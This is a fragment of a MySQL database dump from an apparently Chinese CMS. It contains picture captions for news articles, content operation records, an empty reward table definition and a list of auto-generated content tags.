INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,5,'/u/cms/www/201610/10132322exj1.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,6,'/u/cms/www/201610/10132327lk40.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,7,'/u/cms/www/201610/10132336658k.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,8,'/u/cms/www/201610/10132342mxeq.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,9,'/u/cms/www/201610/10132347qr6a.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (119,0,'/u/cms/www/201610/101326217xkx.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (119,1,'/u/cms/www/201610/10132629r00n.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (119,2,'/u/cms/www/201610/10132635f63e.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (120,0,'/u/cms/www/201610/10133454sydj.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (120,1,'/u/cms/www/201610/10133506taqx.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (120,2,'/u/cms/www/201610/10133511s7r1.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (120,3,'/u/cms/www/201610/101335147ye6.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,0,'/u/cms/www/201610/11094215kqsv.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,1,'/u/cms/www/201610/11094229szn0.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,2,'/u/cms/www/201610/11094234lj78.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,3,'/u/cms/www/201610/11094239ard1.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,4,'/u/cms/www/201610/11094243v534.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,5,'/u/cms/www/201610/11094246016h.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,6,'/u/cms/www/201610/11094250fq4t.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,7,'/u/cms/www/201610/11094254usxs.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,8,'/u/cms/www/201610/11094257nm5d.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,9,'/u/cms/www/201610/11094309iwnb.jpg','乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (141,10,'/u/cms/www/201610/11094419duy6.jpg','乌兰布统牧歌秋韵');

#
# Source for table jc_content_record
#

CREATE TABLE `jc_content_record` (
  `content_record_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '文章ID',
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '操作人',
  `operate_time` datetime NOT NULL COMMENT '操作时间',
  `operate_type` tinyint(2) NOT NULL DEFAULT '0' COMMENT '0 新增 1修改 2审核 3退回 4移动 5生成静态页 6删除到回收站 7归档 8出档 9推送共享',
  PRIMARY KEY (`content_record_id`),
  KEY `fk_index_jc_content_record_content` (`content_id`),
  KEY `fk_index_jc_content_record_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='文章操作记录';

#
# Dumping data for table jc_content_record
#

INSERT INTO `jc_content_record` (`content_record_id`,`content_id`,`user_id`,`operate_time`,`operate_type`) VALUES (1,130,1,'2016-10-11 17:29:39',1);
INSERT INTO `jc_content_record` (`content_record_id`,`content_id`,`user_id`,`operate_time`,`operate_type`) VALUES (12,128,1,'2017-12-26 18:44:30',3);
INSERT INTO `jc_content_record` (`content_record_id`,`content_id`,`user_id`,`operate_time`,`operate_type`) VALUES (13,131,1,'2017-12-26 18:44:51',3);
INSERT INTO `jc_content_record` (`content_record_id`,`content_id`,`user_id`,`operate_time`,`operate_type`) VALUES (14,132,1,'2017-12-26 18:44:54',3);

#
# Source for table jc_content_reward_fix
#

CREATE TABLE `jc_content_reward_fix` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '10',
  `reward_fix` double NOT NULL DEFAULT '0' COMMENT '固定值',
  UNIQUE KEY `jc_content_reward_fix` (`content_id`,`priority`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容打赏设置固定值';

#
# Dumping data for table jc_content_reward_fix
#


#
# Source for table jc_content_tag
#

CREATE TABLE `jc_content_tag` (
  `tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(50) NOT NULL COMMENT 'tag名称',
  `ref_counter` int(11) NOT NULL DEFAULT '1' COMMENT '被引用的次数',
  PRIMARY KEY (`tag_id`),
  UNIQUE KEY `ak_tag_name` (`tag_name`)
) ENGINE=InnoDB AUTO_INCREMENT=716 DEFAULT CHARSET=utf8 COMMENT='CMS内容TAG表';

#
# Dumping data for table jc_content_tag
#

INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (3,'2016',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (8,'法国',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (9,'尼斯',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (10,'发生',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (11,'汽车',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (12,'冲撞',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (13,'事故',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (14,'已',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (15,'致',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (16,'75人',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (17,'死',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (18,'上百人',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (19,'伤',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (21,'拍摄',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (24,'破',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (42,'四川',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (59,'之',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (61,'震撼',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (62,'视角',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (63,'年度',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (64,'无人机',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (65,'摄影',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (66,'大赛',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (67,'佳作',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (68,'大赏',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (71,'南海',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (102,'习近平',3);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (103,'恐',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (104,'袭',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (105,'事件',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (107,'向',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (108,'法',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (109,'总统',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (110,'慰问电',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (111,'中国空军',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (112,'航空兵',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (113,'赴',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (114,'常态',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (115,'化',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (116,'战斗',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (117,'巡航',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (118,'宁夏',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (119,'考察',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (120,'第一天',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (121,'长征',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (122,'永',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (123,'远在',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (124,'路上',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (139,'十一',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (140,'黄金周',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (141,'凯里',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (142,'地区',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (143,'文化',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (144,'旅游活动',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (145,'精彩纷呈',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (149,'一带',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (150,'一路',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (151,'打开',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (152,'筑',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (153,'梦',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (154,'空间',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (155,'加拿大',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (156,'同意',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (157,'中国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (158,'协商',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (159,'引渡',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (160,'条约',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (161,'转变',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (162,'抵制',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (163,'态度',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (164,'深圳',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (165,'二手房',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (166,'卖主',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (167,'悔',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (168,'约',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (169,'不服',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (170,'判决',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (171,'纠集',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (172,'60',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (173,'余人',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (174,'冲击',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (175,'法院',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (176,'不实',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (177,'名',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (178,'手机号',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (179,'停机',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (180,'在即',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (181,'移动',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (182,'不对',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (183,'任何',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (184,'社会',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (185,'渠道',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (186,'授权',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (187,'网络',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (188,'售',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (189,'卡',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (199,'亚马逊',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (200,'股价',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (201,'首',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (202,'800',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (203,'美元',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (204,'大关',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (205,'市值',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (206,'稳',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (207,'居',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (208,'全球',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (209,'上市公司',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (210,'第四',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (212,'百度',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (230,'海',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (231,'银',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (232,'系',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (233,'接',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (234,'盘',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (235,'匹',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (236,'凸',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (237,'谜',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (238,'局',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (239,'待',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (240,'解',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (241,'p2p',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (242,'业务',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (243,'惨淡',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (244,'收场',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (245,'多次',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (246,'调查',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (247,'苹果',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (248,'研发',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (249,'神秘',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (250,'新',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (251,'设备',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (252,'体积',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (253,'类似',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (254,'apple',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (255,'tv',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (256,'支持',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (257,'nfc',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (258,'蓝牙',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (269,'一',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (271,'理塘县',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (272,'4.9级',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (273,'地震',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (274,'震源',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (275,'深度',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (276,'19千米',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (286,'web',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (287,'前端',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (288,'开发人员',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (289,'asp.net',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (290,'开发',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (291,'工程师',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (292,'文案',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (293,'编辑',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (298,'双休',6);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (322,'北京',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (323,'天安门广场',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (324,'祝福',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (325,'祖国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (326,'大',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (327,'花篮',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (328,'吊装',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (329,'完毕',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (340,'墨西哥',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (341,'油轮',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (342,'失火',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (345,'南瓜',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (351,'本',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (352,'网',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (353,'记者',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (354,'体验',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (355,'360行',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (356,'183',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (357,'另类',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (358,'复制',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (365,'旅',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (366,'比大',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (367,'熊猫',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (368,'宝宝',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (369,'取名',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (370,'天宝',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (375,'莫斯科',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (376,'举办',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (377,'国际',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (378,'灯光',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (379,'节',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (388,'宇航员',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (389,'地球',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (390,'夜景',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (391,'灯火',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (392,'辉煌灿烂',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (393,'海水',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (394,'平滑',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (395,'如',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (396,'镜',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (398,'妖',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (399,'倾城',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (414,'诗',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (435,'高性能',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (436,'年终奖',5);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (437,'五险一金',5);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (438,'带薪年假',5);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (439,'节日福利',4);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (500,'专访',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (501,'科学家',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (502,'徐',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (503,'伟',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (504,'谷歌',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (505,'人工智能',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (506,'平台',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (507,'更易',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (508,'上手',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (509,'电信',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (510,'诈骗',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (511,'多发',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (512,'产生',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (513,'蝴蝶效应',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (514,'虚拟',1);
